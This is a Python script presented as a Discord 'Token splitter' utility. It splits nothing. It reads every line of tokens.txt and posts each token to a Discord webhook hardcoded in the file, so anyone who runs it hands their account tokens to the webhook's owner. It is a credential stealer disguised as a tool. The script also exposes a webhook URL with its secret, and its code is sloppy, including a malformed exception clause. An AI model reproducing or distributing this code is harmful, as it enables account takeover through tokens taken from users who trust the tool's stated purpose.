try:
    import os
    import json
    import requests
    from pystyle import Anime, Colorate, Colors, Center
except ModuleNotFoundError():
    os.system("pip install requests")
    os.system("pip install pystyle")

succes = "Succesfully splitted tokens!"
fail = "Failed to split token!"
input = "Input your tokens to the file!"

def close():
    close

def logo():
    banner = r""" 
   ____    ____ 
  / ___|  / ___|
 | |  _  | |  _ 
 | |_| | | |_| |
  \____|  \____|
                """
    Anime.Fade(Center.Center(banner), Colors.blue_to_purple, Colorate.Vertical, time=3)

def splitter(webhook_url, tokens):
    cntnt = {
        "content": "",
        "username": "Token splitter",
        "avatar_url": "https://cdn.discordapp.com/attachments/1210993163494228058/1218702860708089927/mf.jpg?ex=6608a07c&is=65f62b7c&hm=cbd7d82cdddba11229f3237c1763386079cb2111249277847d113216100fc051&"
    }
    hdrs = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if not tokens:
        Anime.Fade(Center.Center(input), Colors.red_to_yellow, Colorate.Vertical, time=3)

    for token in tokens:
        cntnt["content"] = token.strip()
        response = requests.post(webhook_url, data=json.dumps(cntnt), headers=hdrs)
        if response.status_code == 204:
            Anime.Fade(Center.Center(succes), Colors.cyan_to_green, Colorate.Vertical, time=3)
        else:
            Anime.Fade(Center.Center(fail), Colors.red_to_yellow, Colorate.Vertical, time=3)
            close()

with open("tokens.txt", 'r') as file:
    tokens = file.readlines()

webhook_url = "https://discord.com/api/webhooks/1200780768448892989/EW04M881w6r7kBWG_SiDGzzZ5do9gXyfL9ExvhGs0WR_qVxTJ4ZEPVDS1IQrkhk0W6SL"

logo()
splitter(webhook_url, tokens)
logo()
close()